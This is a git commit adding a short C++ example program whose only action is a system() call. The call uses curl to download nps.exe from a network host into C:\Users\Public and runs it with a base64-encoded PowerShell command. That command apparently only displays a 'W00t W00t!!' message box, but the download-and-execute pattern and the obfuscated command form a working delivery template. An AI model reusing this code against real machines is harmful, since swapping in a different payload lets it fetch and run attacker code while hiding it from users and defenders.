96310f17ff8acd21a530cb7f813a976c3bdd364c
Kartik Durg <kartik3323@gmail.com>
2020-06-29 02:46:36 +0530

    Add files via upload
    Added the examples

---
+++ Examples/System/system.cc
@@ -0,0 +1,8 @@
+#include <iostream>
+#include <stdlib.h>
+using namespace std;
+
+int main(int argc, const char *argv[]) {
+	system("curl http://192.168.0.107/nps.exe --output C:\\Users\\Public\\nps.exe && C:\\Users\\Public\\nps.exe -encodedcommand QQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAgAFAAcgBlAHMAZQBuAHQAYQB0AGkAbwBuAEMAbwByAGUALABQAHIAZQBzAGUAbgB0AGEAdABpAG8AbgBGAHIAYQBtAGUAdwBvAHIAawA7ACQAbQBzAGcAQgBvAGQAeQAgAD0AIAAiAFcAMAAwAHQAIABXADAAMAB0ACEAIQAiADsAWwBTAHkAcwB0AGUAbQAuAFcAaQBuAGQAbwB3AHMALgBNAGUAcwBzAGEAZwBlAEIAbwB4AF0AOgA6AFMAaABvAHcAKAAkAG0AcwBnAEIAbwBkAHkAKQA=");
+	return 0;
+}
